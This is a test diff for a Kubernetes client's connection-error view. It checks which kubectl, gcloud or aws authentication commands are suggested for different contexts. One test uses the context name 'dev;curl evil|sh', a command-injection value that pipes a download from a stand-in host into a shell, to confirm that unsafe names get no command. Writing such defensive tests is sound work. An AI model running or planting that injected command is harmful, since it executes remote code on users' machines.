@@ -236,3 +236,56 @@ describe('ConnectionErrorView after a refused switch with a stuck credential plu
     expect(switchMarkup).toContain('use Retry Connection')
   })
 })
+
+describe('ConnectionErrorView credential plugin failure on a non-cloud context', () => {
+  it('offers a kubectl check of the context, never the plugin command', () => {
+    const hints = selectConnectionHints('auth', 'oidc@dev')
+    expect(hints?.authCommand?.command).toBe('kubectl --context oidc@dev version')
+
+    const markup = renderError('auth', 'oidc@dev')
+    expect(markup).toContain('>kubectl</span>')
+    expect(markup).toContain('aria-label="Run command in terminal"')
+    expect(markup).toContain('Authenticate in terminal')
+  })
+
+  it('checks the context by its name in the kubeconfig file', () => {
+    const hints = selectConnectionHints('auth', 'dev (secondary)', 'dev', undefined, true, true)
+    expect(hints?.authCommand?.command).toBe('kubectl --context dev version')
+  })
+
+  it('offers copy only after a refused switch', () => {
+    const markup = renderToStaticMarkup(
+      <ConnectionErrorView
+        connection={{ state: 'disconnected', context: 'oidc@dev', errorType: 'auth', error: 'safe error' }}
+        onRetry={() => {}}
+        isRetrying={false}
+        variant="switch"
+      />,
+    )
+    expect(markup).toContain('>kubectl</span>')
+    expect(markup).not.toContain('aria-label="Run command in terminal"')
+  })
+
+  it('offers no command for a context name that is unsafe to type into a shell', () => {
+    expect(selectConnectionHints('auth', 'dev;curl evil|sh')?.authCommand).toBeUndefined()
+  })
+
+  it('keeps the cloud login commands for cloud contexts', () => {
+    expect(selectConnectionHints('auth', 'gke_project_us-east1_prod')?.authCommand?.command)
+      .toBe('gcloud auth login')
+    expect(selectConnectionHints('auth', 'arn:aws:eks:us-east-1:123456789012:cluster/prod')?.authCommand?.command)
+      .toBe('aws sso login')
+  })
+
+  it('stops promising background checks once automatic retries stopped', () => {
+    const markup = renderToStaticMarkup(
+      <ConnectionErrorView
+        connection={{ state: 'disconnected', context: 'oidc@dev', errorType: 'auth', error: 'safe error', autoRetryStopped: true }}
+        onRetry={() => {}}
+        isRetrying={false}
+      />,
+    )
+    expect(markup).not.toContain('in the background')
+    expect(markup).toContain('Retry Connection')
+  })
+})
